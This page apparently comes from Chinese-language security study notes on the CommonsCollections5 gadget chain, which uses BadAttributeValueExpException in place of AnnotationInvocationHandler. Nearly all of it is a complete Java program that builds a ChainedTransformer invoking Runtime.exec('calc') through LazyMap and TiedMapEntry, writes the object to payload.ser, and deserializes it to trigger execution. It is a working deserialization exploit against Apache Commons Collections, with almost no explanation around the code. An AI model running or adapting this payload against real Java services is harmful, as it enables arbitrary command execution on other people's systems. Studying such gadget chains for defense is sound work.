---
description: BadAttributeValueExpException替代AnnotationInvocationHandler
---

# CommonsCollections5

PayLoad:

```java
import com.nqzero.permit.Permit;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import static sun.reflect.misc.FieldUtil.getField;
public class CommonsCollections5 {
    //setFieldValue用于设置obj对象的成员变量fieldName的值为value
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = null;
        try {
            //获取私有成员变量
            field = obj.getClass().getDeclaredField(fieldName);
            //获取私有成员变量访问权限
            Permit.setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (obj.getClass().getSuperclass() != null)
                field = getField(obj.getClass().getSuperclass(), fieldName);
        }
        field.set(obj, value);
    }
    //  获取成员变量值的
    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        Field field = null;
        try {
            field = obj.getClass().getDeclaredField(fieldName);
            Permit.setAccessible(field);
        }
        catch (NoSuchFieldException ex) {
            if (obj.getClass().getSuperclass() != null)
                field = getField(obj.getClass().getSuperclass(), fieldName);
        }
        return field.get(obj);
    }
    public static void main(String[] args) throws Exception {
        String command = "calc";
        final String[] execArgs = new String[] { command };
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };
        final Map innerMap = new HashMap();
        //创建factory为恶意ChainedTransformer对象的lazyMap类实例
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        //创建map为恶意lazyMap，key为foo的TiedMapEntry类实例
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        //将BadAttributeValueExpException对象的成员变量val赋值为恶意entry
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Permit.setAccessible(valfield);
        valfield.set(val, entry);
        setFieldValue(transformerChain, "iTransformers", transformers);
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(val);
        oos.flush();
        oos.close();
        FileInputStream fis = new FileInputStream("payload.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object newObj = ois.readObject();
        ois.close();
    }
}

```



